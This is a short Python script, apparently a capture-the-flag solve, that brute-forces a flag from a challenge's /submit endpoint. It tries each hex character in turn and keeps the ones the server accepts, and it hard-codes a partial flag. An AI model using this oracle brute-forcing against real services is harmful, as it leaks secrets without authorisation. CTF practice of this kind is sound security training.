#!/usr/bin/env python3
import requests
import time
from string import printable
from ast import literal_eval
url = 'https://real-vulnerability-chall.knping.pl/submit'
flag = 'ping{W0w_th4t_w45_5m4rt_7230fae6d5f9cfa9c9d1f6a1f737eedb4beb0ccc78cbc39e9bf970ef5'
hex = [0,1,2,3,4,5,6,7,8,9,'a', 'b', 'c', 'd', 'e', 'f','}']
while True:
	for char in hex:
		r = requests.post(url,data=flag+str(char))
		set_r = literal_eval(str(r.text).replace('true','True').replace('false','False'))
		print(flag+str(char))
		if set_r['error'] == False:
			flag+=str(char)
			print('WE GOT A HIT',flag)
		time.sleep(0.5)